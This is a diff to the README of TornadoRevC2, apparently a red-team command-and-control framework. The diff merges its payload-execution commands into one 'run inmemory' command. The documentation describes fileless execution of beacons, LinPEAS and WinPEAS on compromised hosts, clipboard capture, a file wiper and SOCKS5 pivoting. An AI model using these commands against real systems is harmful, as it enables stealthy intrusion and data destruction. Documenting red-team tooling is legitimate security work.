@@ -100,7 +100,8 @@ sysinfo 1                       # Collect host information
 run quickenum 1                 # Fast structured triage
 run history 1                   # Shell history and login activity
 run mounts 1                    # Mounts, shares, and filesystem layout
-run privesccheck 1 ./linpeas.sh # Privilege escalation scan (operator-supplied script)
+run inmemory 1 sh ./linpeas.sh           # Shell script (e.g. LinPEAS)
+run inmemory 1 bat C:\tools\winPEAS.bat  # Batch script (e.g. WinPEAS)
 ```
 
 When attached to a session via `switch <ID>`, omit the session ID from commands that normally require one (for example, `run quickenum` instead of `run quickenum 1`).
@@ -148,10 +149,9 @@ Inside an attached shell, omit `<ID>` from transfer commands.
 
 | Command | Description |
 |---------|-------------|
-| `runpy <ID> <local.py> [-- args] [--save-output <file>]` | Execute Python from memory |
-| `runps <ID> <local.ps1> [--save-output <file>]` | Execute PowerShell from memory |
-| `runexe <ID> <local.exe> [-- args] [--save-output <file>]` | Execute a Windows PE with output capture |
-| `runelf <ID> <local_binary> [-- args] [--save-output <file>]` | Execute a Linux ELF via `memfd_create` |
+| `run inmemory <ID> <filetype> <local_file> [-- args] [--save-output <file>]` | Unified in-memory execution (`py`, `ps`, `exe`, `elf`, `bat`, `sh`) |
+
+Inside an attached shell, omit `<ID>`: `run inmemory <filetype> <local_file> [...]`
 
 ### Network pivoting
 
@@ -195,9 +195,23 @@ Uploads and downloads use chunked I/O with SHA-256 verification. The `--resume` 
 
 Payloads are staged and executed in memory where supported, with optional stdout/stderr capture to a local file. Temporary artifacts are cleaned up after Windows PE execution.
 
+All in-memory execution lives in the `inmemory` shared plugin (`tornadorevc2/plugins/shared/inmemory.py`).
+
+| Filetype | Method |
+|----------|--------|
+| `py` | Python — in-memory on Unix; temp file on Windows |
+| `ps` | PowerShell — in-memory via `Invoke-Expression` |
+| `exe` | Windows PE — staged temp execution with output capture |
+| `elf` | Linux ELF — `memfd_create` with `/dev/shm` fallback |
+| `sh` | Shell script — verified transfer, streams via `bash -s` |
+| `bat` | Batch script — verified transfer, streamed `cmd.exe` execution |
+
 ```bash
-runexe 1 C:\tools\payload.exe -- --flag value
-runexe 1 beacon.exe --save-output C:\local\output.txt
+run inmemory 1 py /tools/script.py
+run inmemory 1 sh ./linpeas.sh
+run inmemory 1 bat C:\tools\winPEAS.bat
+run inmemory 1 exe C:\tools\payload.exe -- --flag value
+run inmemory 1 exe beacon.exe --save-output C:\local\output.txt
 ```
 
 ### SOCKS5 pivoting
@@ -457,7 +471,7 @@ def run(session: SessionContext, args):
     ...
 ```
 
-See the built-in `wiper` and `privesccheck` plugins for file-path and local-script argument patterns.
+See the built-in `wiper` plugin and `run inmemory bat` / `run inmemory sh` for local-script execution patterns.
 
 #### SessionContext API
 
@@ -490,12 +504,12 @@ For structured JSON collectors, start from `run_collector_plugin` in `tornadorev
 
 | Plugin | Description |
 |--------|-------------|
+| `inmemory` | Unified in-memory payload execution (`py`, `ps`, `exe`, `elf`, `bat`, `sh`) |
 | `quickenum` | Fast structured host assessment: identity, network, environment, and prioritized findings |
 | `virtualization` | Virtualization, container, orchestration, and cloud environment detection |
 | `history` | Shell history, package/update logs, and recent login activity |
 | `mounts` | Mount points, SMB/NFS shares, mapped drives, and container-related filesystems |
 | `clipboard` | Remote clipboard text capture |
-| `privesccheck` | LinPEAS / WinPEAS execution (operator-supplied script) |
 | `wiper` | Multi-pass secure file overwrite followed by deletion |
 
 ### Linux / Unix
@@ -521,6 +535,29 @@ For structured JSON collectors, start from `run_collector_plugin` in `tornadorev
 ---
 
 ## Plugin Reference
+
+### In-Memory Execution
+
+Execute local payloads on the remote host without writing persistent artifacts where supported.
+
+```bash
+run inmemory 1 py /tools/script.py
+run inmemory 1 exe C:\tools\beacon.exe -- --flag value
+run inmemory 1 elf /tools/agent --save-output ./output.txt
+run inmemory 1 sh ./linpeas.sh
+run inmemory 1 bat C:\tools\winPEAS.bat
+```
+
+| Filetype | Description |
+|----------|-------------|
+| `py` | Python — in-memory on Unix; temp file on Windows |
+| `ps` | PowerShell — in-memory via `Invoke-Expression` |
+| `exe` | Windows PE — staged temp execution with output capture |
+| `elf` | Linux ELF — `memfd_create` with `/dev/shm` fallback |
+| `sh` | Shell script — SHA256-verified transfer, streams via `bash -s` |
+| `bat` | Batch script — SHA256-verified transfer, streamed `cmd.exe` execution |
+
+Download LinPEAS / WinPEAS from [PEASS-ng](https://github.com/carlospolop/PEASS-ng).
 
 ### QuickEnum
 
@@ -568,22 +605,6 @@ run clipboard 1
 
 **Windows:** `System.Windows.Forms.Clipboard` with `Get-Clipboard` fallback.  
 **Linux / Unix:** `wl-paste`, `xclip`, or `xsel` (requires a graphical session).
-
-### Privilege Escalation Check
-
-Executes operator-supplied LinPEAS or WinPEAS scripts against the target. Scripts are not bundled with TornadoRevC2.
-
-```bash
-run privesccheck 1 ./linpeas.sh
-run privesccheck 2 C:\tools\winPEAS.bat
-```
-
-| Platform | Accepted formats | Execution method |
-|----------|------------------|------------------|
-| Linux / Unix | `.sh` | Piped into `bash` stdin; large scripts may stage in `/dev/shm` |
-| Windows | `.bat`, `.cmd`, `.exe` | PowerShell decode or staged binary with cleanup |
-
-Download scripts from [PEASS-ng](https://github.com/carlospolop/PEASS-ng).
 
 ### Wiper
 
@@ -636,7 +657,6 @@ TornadoRevC2/
 │   ├── sysinfo.py               # Host information collection
 │   ├── terminal.py              # PTY/TTY management and signal handling
 │   ├── transfer.py              # Chunked file transfers
-│   ├── payload_exec.py          # In-memory payload execution
 │   ├── tunnel.py                # SOCKS5 pivoting
 │   ├── win_client.py            # Windows shell detection and script delivery
 │   ├── session_registry.py      # Session persistence and reconnect logic
@@ -647,7 +667,7 @@ TornadoRevC2/
 │       ├── api.py               # SessionContext and plugin registration
 │       ├── manager.py           # Plugin lifecycle management
 │       ├── loader.py            # Automatic module discovery
-│       ├── shared/              # Cross-platform plugin implementations
+│       ├── shared/              # Cross-platform plugins (inmemory, history, …)
 │       ├── linux/               # Linux/Unix collector builders
 │       └── windows/             # Windows collector builders
 ├── plugins/                     # Optional external plugin directory
